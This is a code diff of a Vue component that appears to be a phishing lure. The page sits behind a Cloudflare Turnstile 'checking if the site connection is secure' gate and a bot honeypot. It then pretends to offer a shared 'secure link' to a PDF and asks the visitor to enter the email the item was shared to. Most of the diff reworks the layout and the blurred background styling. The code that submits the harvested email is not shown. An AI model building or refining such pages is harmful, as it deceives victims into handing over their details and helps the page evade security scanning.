@@ -1,49 +1,55 @@
 <template>
-  <div v-if="!captchaToken" class="gate-container">
-    <main>
-      <div class="instructions captcha-adjusted">
-        <p>Please stand by while we are checking if the site connection is secure.</p>
-        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
-      </div>
-    </main>
-  </div>
+  <div class="fullscreen-wrapper">
+    <!-- Background layer -->
+    <div class="background-blur"></div>
 
-  <div v-else class="background">
-    <div class="toto-container">
-      <div class="header">
-        <div class="logo-text">
-          <span class="success-check"></span>
+    <!-- CAPTCHA Gate -->
+    <div v-if="!captchaToken" class="gate-container">
+      <main>
+        <div class="instructions captcha-adjusted">
+          <p>Please stand by while we are checking if the site connection is secure.</p>
+          <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
         </div>
-      </div>
+      </main>
+    </div>
 
-      <div class="content">
-       <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30">
-        <p>You've received a secure link to:</p>
-        <p style="font-size: 16px;">AA484937-13-06-2025.pdf</p>
-        <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>
-        <div class="form-wrapper">
-          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
-          <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />
-
-          <label for="email" class="visually-hidden">Email address</label>
-          <input id="email" v-model="email" type="email" placeholder="Enter email" required class="email-input" :disabled="loading" />
-
-          <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
-
-          <button @click="submitForm" :disabled="loading" class="action-button">
-            {{ loading ? 'Next' : 'Next' }}
-          </button>
+    <!-- Email Verification Section -->
+    <div v-else class="background">
+      <div class="toto-container">
+        <div class="header">
+          <div class="logo-text">
+            <span class="success-check"></span>
+          </div>
         </div>
-      </div>
 
-      <div class="divider"></div>
+        <div class="content">
+          <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
+          <p>You've received a secure link to:</p>
+          <p style="font-size: 16px;">AA484937-13-06-2025.pdf</p>
+          <p style="font-size: 16px;">To proceed, enter the email that this <br />item was shared to</p>
 
-      <div class="footer-container">
-        <p class="footer-text">
-          © 2025
-          <a href="/privacy" target="_blank">Privacy Policy</a>
-        
-        </p>
+          <div class="form-wrapper">
+            <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
+            <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />
+
+            <label for="email" class="visually-hidden">Email address</label>
+            <input id="email" v-model="email" type="email" placeholder="Enter email" required class="email-input" :disabled="loading" />
+
+            <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
+
+            <button @click="submitForm" :disabled="loading" class="action-button">
+              {{ loading ? 'Next' : 'Next' }}
+            </button>
+          </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="footer-container">
+          <p class="footer-text">
+            © 2025 <a href="/privacy" target="_blank">Privacy Policy</a>
+          </p>
+        </div>
       </div>
     </div>
   </div>
@@ -82,7 +88,7 @@ onMounted(async () => {
           turnstileRendered = false
           window.turnstile.render('.cf-turnstile', {
             sitekey: '0x4AAAAAABgei6QZruCN7n08',
-            callback: t => captchaToken.value = t
+            callback: t => (captchaToken.value = t)
           })
         }, 120000)
       }
@@ -129,34 +135,7 @@ async function submitForm() {
 }
 </script>
 
-
-
-
-
-
-
 <style scoped>
-  :root {
-  --bg-image: url('https://i.postimg.cc/s2TBQ89k/ldimg1.png'); /* Update this as needed */
-}
-
-.background::before,
-.gate-container::before {
-  content: '';
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100vw;
-  height: 100vh;
-  background-image: var(--bg-image);
-  background-size: cover;
-  background-position: center;
-  background-repeat: no-repeat;
-  z-index: -2;
-  filter: blur(12px) brightness(0.7);
-
-}
-
 .visually-hidden {
   position: absolute !important;
   height: 1px;
@@ -170,20 +149,19 @@ async function submitForm() {
   margin-top: 18vh !important;
 }
 
-html, body {
-  height: 100vh;
+html,
+body {
   margin: 0;
   padding: 0;
-  overflow: hidden;
   font-family: Arial, sans-serif;
-  background-color: #FAF9F6;
-  color: #000;
+  height: 100%;
+  overflow: hidden;
+  background: transparent;
 }
 
-.background, .gate-container {
-  position: fixed;
-  top: 0;
-  left: 0;
+.background,
+.gate-container {
+  position: relative;
   height: 100vh;
   width: 100vw;
   display: flex;
@@ -193,7 +171,7 @@ html, body {
   background-color: transparent;
   padding-top: 40px;
   box-sizing: border-box;
-
+  z-index: 0;
 }
 
 .cf-turnstile {
@@ -303,45 +281,34 @@ html, body {
   font-size: 0.85rem;
   color: #777;
   margin-top: 0.1rem;
-  margin-buttom: 2.5rem;
+  margin-bottom: 2.5rem;
 }
 
 .footer-text a {
   color: inherit;
   text-decoration: none;
 }
+</style>
 
-@media (prefers-color-scheme: dark) {
-  html, body,
-  .background,
-  .gate-container {
-    background-color: #121212;
-    color: #000;
-  }
+<!-- Background Blur Layer (not scoped) -->
+<style>
+.fullscreen-wrapper {
+  position: relative;
+  width: 100vw;
+  height: 100vh;
+  overflow: hidden;
+}
 
-  .instructions,
-  .toto-container {
-    color: #ffffff;
-  }
-
-  .toto-container {
-    background: #1e1e1e;
-    box-shadow: 0 1px 20px rgba(255, 255, 255, 0.05);
-  }
-
-  .email-input {
-    background-color: #2b2b2b;
-    border-color: #444;
-    color: #ffffff;
-    caret-color: #ffffff;
-  }
-
-  .error {
-    color: #ff6b6b;
-  }
-
-  .action-button:hover:not(:disabled) {
-    background-color: #1a1a1a;
-  }
+.background-blur {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background-image: url('https://i.postimg.cc/9XJYQwbn/bg-secure.jpg'); /* Changeable */
+  background-size: cover;
+  background-position: center;
+  filter: blur(12px) brightness(0.7);
+  z-index: -1;
 }
 </style>
